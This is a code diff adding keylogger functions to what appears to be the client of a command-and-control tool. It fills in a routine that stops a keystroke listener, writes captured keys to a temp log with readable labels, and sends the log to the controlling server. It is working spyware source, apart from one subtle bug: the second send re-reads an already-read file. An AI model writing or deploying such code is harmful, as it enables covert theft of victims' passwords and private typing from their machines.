@@ -271,19 +271,78 @@ def on_press(key_press):
     global keyLogs
     keyLogs.append(key_press)
 
-
+# Define Function to Start a Key Logger on the C2 Client
 def keylogger_on():
     global listener, keyLogs
+
     # When listener is None, mean the keylogger is OFF
     if listener is None:
         listener = Listener(on_press=on_press)
         listener.start()
+
         send(b"[+]-Client => A Key Logger is now Running on the Client.\n")
+
     else:
         send(b"[!]-Client => A Key Logger is already Running on the Client.\n")
 
+# Define Function to hutting down the Key Logger on the client and write the pressed keys to disk
 def keylogger_off():
-    pass
+    global listener, keyLogs
+    # When listener is Not None(True), mean the keylogger is ON
+    if listener is not None:
+        listener.stop()
+
+        with open(TMP + 'keys.log', 'a') as fh:
+            # Read every key pressed and make it more readable for us
+            for aKeyPressed in keyLogs:
+                fh.write(str(aKeyPressed)
+                         .replace("Key.enter", "\n").replace("'","")
+                         .replace("Key.space", " ").replace('""', "'")
+                         .replace("Key.shift_r", " SHIFT ").replace("Key.shift_l", " SHIFT ")
+                         .replace("Key.backspace", " BackSpace ").replace("Key.shift"," SHIFT ")
+                         .replace("Key.caps_lock", " CapsLock ").replace("Key.ctrl_l", " CTRL ")
+                         .replace("Key.ctrl_r", " CTRL ").replace("Key.alt_l", " ALT ")
+                         .replace("Key.alt_r", " ALT ").replace("Key.tab", " TAB ")
+                         .replace("Key.cmd", " CMD ").replace("Key.cmd_r", " CMD ")
+                         .replace("Key.up", " UP ").replace("Key.down", " DOWN ")
+                         .replace("Key.left", " LEFT ").replace("Key.right", " RIGHT ")
+                         .replace("Key.delete", " DEL ").replace("Key.insert", " INS ")
+                         .replace("Key.home", " HOME ").replace("Key.end", " END ")
+                         .replace("Key.page_up", " PAGE UP ").replace("Key.page_down", " PAGE DOWN "))
+
+        with open(TMP + 'keys.log', 'r') as fh:
+            dataLogged = fh.read()
+
+            # First Send: Send len of byteData to the server
+            send(str.encode(str(len(dataLogged))))
+
+            sleep(0.1)
+
+            # Second Send: Send the data to the server
+            send(fh.read().encode())
+
+                         # .replace("Key.f1", " F1 ").replace("Key.f2", " F2 ")
+        # Clear the keyLog list and Re-Initialize the listener to signify 'Not On'
+        keyLogs.clear()
+        listener = None
+        send(b"[+]-Client => A Key Logger is now Off.\n")
+
+                    # k = str(key).replace("'", "")
+                    # if k.find("backspace") > 0:
+                    #     fh.write(' BackSpace ')
+                    # elif k.find("enter") > 0:
+                    #     fh.write('\n')
+                    # elif k.find("shift") > 0:
+                    #     fh.write(' Shift ')
+                    # elif k.find("space") > 0:
+                    #     fh.write(' ')
+                    # elif k.find("caps_lock") > 0:
+                    #     fh.write(' CapsLock ')
+                    # elif k.find("Key"):
+                    #     fh.write(k)
+
+
+
 
 def main_exec():
     while True:
